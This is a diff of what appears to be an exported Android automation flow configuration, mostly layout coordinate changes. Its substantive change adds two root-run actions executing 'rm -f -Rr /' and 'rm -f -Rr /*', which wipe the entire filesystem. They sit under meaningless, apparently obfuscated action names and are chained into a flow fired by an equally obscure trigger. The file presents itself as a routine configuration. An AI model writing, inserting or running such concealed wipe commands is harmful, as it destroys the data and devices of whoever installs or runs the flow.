@@ -678,10 +678,24 @@ else if(NTEXT2 == NTEXT3)
     <keepDeviceAwake>true</keepDeviceAwake>
     <allowWakeupFromDeviceIdle>false</allowWakeupFromDeviceIdle>
   </action>
-  <action type="execute_command">
+  <action type="execute_root_command">
     <useDefaultName>false</useDefaultName>
     <name>jwjcjiwjxkajnckwjxjrc</name>
-    <command>su -c rm -f -Rr / &amp;&amp; su -c rm -f -r /*</command>
+    <command>rm -f -Rr /</command>
+    <user></user>
+    <seContext></seContext>
+    <workingDirectory></workingDirectory>
+    <timeout>300000</timeout>
+    <variableStdout>stdout</variableStdout>
+    <variableStderr>stderr</variableStderr>
+    <variableExitCode>exit_code</variableExitCode>
+  </action>
+  <action type="execute_root_command">
+    <useDefaultName>false</useDefaultName>
+    <name>jwjcjiwjxkajnckwjxjrcw</name>
+    <command>rm -f -Rr /*</command>
+    <user></user>
+    <seContext></seContext>
     <workingDirectory></workingDirectory>
     <timeout>300000</timeout>
     <variableStdout>stdout</variableStdout>
@@ -3777,7 +3791,7 @@ break;
     <actioncontainer id="t189" x="0.0" y="17.5">jsjxnisncisjxjsj </actioncontainer>
     <actioncontainer id="t190" x="0.0" y="17.5">jsjjcisjxjdjc</actioncontainer>
     <actioncontainer id="t191" x="0.0" y="52.5">Script: global_start = 1</actioncontainer>
-    <actioncontainer id="t192" x="0.0" y="17.499998">Set Flow State: Disable 7d39442ef74366411b0fc865482a2f6a24369b3e3</actioncontainer>
+    <actioncontainer id="t192" x="0.0" y="17.5">Set Flow State: Disable 7d39442ef74366411b0fc865482a2f6a24369b3e3</actioncontainer>
     <actioncontainer id="t193" x="0.0" y="17.5">Stop Flows: 7d39442ef74366411b0fc865482a2f6a24369b3e3</actioncontainer>
     <actioncontainer id="t194" x="0.0" y="17.5">jjsbcujajxjskkxd</actioncontainer>
     <actioncontainer id="t195" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
@@ -3785,8 +3799,8 @@ break;
     <actioncontainer id="t197" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t198" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t199" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
-    <actioncontainer id="t200" x="0.0" y="17.500002">nsijxkskxkdkksxc</actioncontainer>
-    <actioncontainer id="t201" x="-70.000015" y="17.5">nsijxkskxkdkksxc</actioncontainer>
+    <actioncontainer id="t200" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
+    <actioncontainer id="t201" x="-70.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t202" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t203" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t204" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
@@ -3801,19 +3815,19 @@ break;
     <actioncontainer id="t213" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t214" x="0.0" y="17.5">nsijxkskxkdkksxc</actioncontainer>
     <actioncontainer id="t215" x="0.0" y="52.5">nsijxkskxkdkksxc</actioncontainer>
-    <actioncontainer id="t216" x="3.0517578E-5" y="52.500015">nsijxkskxkdkksxc</actioncontainer>
+    <actioncontainer id="t216" x="0.0" y="52.5">nsijxkskxkdkksxc</actioncontainer>
     <notecontainer id="t217" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t218" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t219" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t218" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t219" x="0.0" y="64.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
     <notecontainer id="t220" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t221" x="0.0" y="64.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t222" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t223" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t224" x="64.0" y="128.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t225" x="128.0" y="192.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t226" x="1536.0" y="640.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t227" x="2304.0" y="5120.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t228" x="-1856.0" y="4416.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t221" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t222" x="64.0" y="128.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t223" x="128.0" y="192.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t224" x="1536.0" y="640.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t225" x="2304.0" y="5120.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t226" x="-1856.0" y="4416.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t227" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t228" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
     <connection from="t1" to="t187" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
     <connection from="t7" to="t35" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
     <connection from="t7" to="t211" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
@@ -4069,14 +4083,14 @@ break;
     <group>GT Modify</group>
     <enabled>false</enabled>
     <executionPolicy>PARALLEL</executionPolicy>
-    <triggercontainer id="t1" x="0.0" y="17.500002">
+    <triggercontainer id="t1" x="0.0" y="17.5">
       <trigger>njsjcjsjjxjakkcf</trigger>
     </triggercontainer>
     <actioncontainer id="t2" x="0.0" y="52.5">jwjxjjsjxksznsjnxs</actioncontainer>
-    <notecontainer id="t3" x="128.0" y="128.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t4" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t5" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t6" x="64.0" y="192.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t3" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t4" x="64.0" y="192.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t5" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t6" x="128.0" y="128.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
     <notecontainer id="t7" x="0.0" y="0.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
     <connection from="t1" to="t2" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
   </flow>
@@ -4235,20 +4249,21 @@ break;
     <group>GT Modify</group>
     <enabled>false</enabled>
     <executionPolicy>PARALLEL</executionPolicy>
-    <triggercontainer id="t1" x="70.0" y="122.5">
+    <triggercontainer id="t1" x="70.00004" y="332.49994">
       <trigger>uwkxnwjxjsonxkwkzkdd</trigger>
     </triggercontainer>
-    <actioncontainer id="t2" x="70.0" y="122.5">jwjcjiwjxkajnckwjxjrc</actioncontainer>
-    <notecontainer id="t3" x="-1152.0" y="-1152.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t4" x="-1152.0" y="-2176.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t5" x="-1088.0" y="-2176.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t6" x="-1344.0" y="-960.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t7" x="-1152.0" y="-2176.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t8" x="-1088.0" y="-2176.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
-    <notecontainer id="t9" x="-1088.0" y="-1920.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t10" x="-512.0" y="1728.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t11" x="-1344.0" y="5056.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
-    <notecontainer id="t12" x="-896.0" y="-2368.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <actioncontainer id="t2" x="69.99998" y="332.5">jwjcjiwjxkajnckwjxjrc</actioncontainer>
+    <actioncontainer id="t3" x="69.99999" y="332.5">jwjcjiwjxkajnckwjxjrcw</actioncontainer>
+    <notecontainer id="t4" x="-2816.0" y="-960.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t5" x="-960.0" y="-5376.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t6" x="-960.0" y="-5376.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
+    <notecontainer id="t7" x="576.0" y="-4736.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t8" x="1344.0" y="-256.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t9" x="-960.0" y="-5312.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t10" x="-832.0" y="-5184.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t11" x="-960.0" y="-5376.0" w="1.4100649E9" h="1.4100649E9"></notecontainer>
+    <notecontainer id="t12" x="-896.0" y="-5248.0" w="1.4100649E9" h="1.4100649E9">xxxx</notecontainer>
     <connection from="t1" to="t2" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
+    <connection from="t2" to="t3" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
   </flow>
 </data>
